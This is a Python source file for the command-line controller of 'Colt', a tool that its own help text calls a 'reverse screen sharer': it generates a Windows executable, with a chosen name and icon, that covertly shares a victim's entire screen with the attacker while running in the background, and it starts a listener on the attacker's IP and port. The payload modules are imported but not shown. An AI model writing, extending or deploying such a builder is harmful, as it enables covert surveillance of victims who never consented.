import os
import argparse
import Main.window_runner as client
import Main.generate_exe as ge

#COLORS INITIALIZE
RED = "\033[0;31m"
GREEN = "\033[0;32m"
BV = "\033[38;5;57m"
CYAN = "\033[38;5;69m"
RESET = "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print('\n')
    banner = [

       " ░█████╗░░█████╗░██╗░░░░░████████╗",
       " ██╔══██╗██╔══██╗██║░░░░░╚══██╔══╝",
       " ██║░░╚═╝██║░░██║██║░░░░░░░░██║░░░",
       " ██║░░██╗██║░░██║██║░░░░░░░░██║░░░",
       " ╚█████╔╝╚█████╔╝███████╗░░░██║░░░",
       " ░╚════╝░░╚════╝░╚══════╝░░░╚═╝░░░"
    ]
    colors = [57, 63, 69, 75, 81, 87]
    for i, line in enumerate(banner):
        txt_color = colors[i % len(colors)]
        print(''.join(f'\033[38;5;{txt_color}m{char}' for char in line))

clear_screen()
print_banner()
print("\n[+] enter -h for all available tags\n")


payload_type = None

while True:
    colt_cm = input(f"{BV}Colt >> {RESET}").split()
    if not colt_cm:
        continue

    parser = argparse.ArgumentParser(description="Colt is a 'reverse screen sharer', what that means is that the attacker can generate an .exe file that when the victim opens, shares their entire screen to the attacker while running background.")
    parser.add_argument("-EXE", "--exe", action="store_true", help="generate .exe for the victim")
    parser.add_argument("-IP", "--ip", help="set ip of the attacker(you)")
    parser.add_argument("-PORT", "--port", help="set port")
    parser.add_argument("-CONNECT", "--connect", action="store_true", help="Starts a listener on specified host and port")
    parser.add_argument("-CLEAR", "--clear", action="store_true", help="Clear ui.")
    parser.add_argument("-NAME", "--name", help="Set name of the executable")
    parser.add_argument("-ICON", "--icon", help="Set the executable's icon")

    args = parser.parse_args(colt_cm)

    if args.exe:
        ge.create_exe(args.ip, args.port, args.name, args.icon)


    elif args.connect:
        client.listener(args.ip, args.port)

    elif args.clear:
        clear_screen()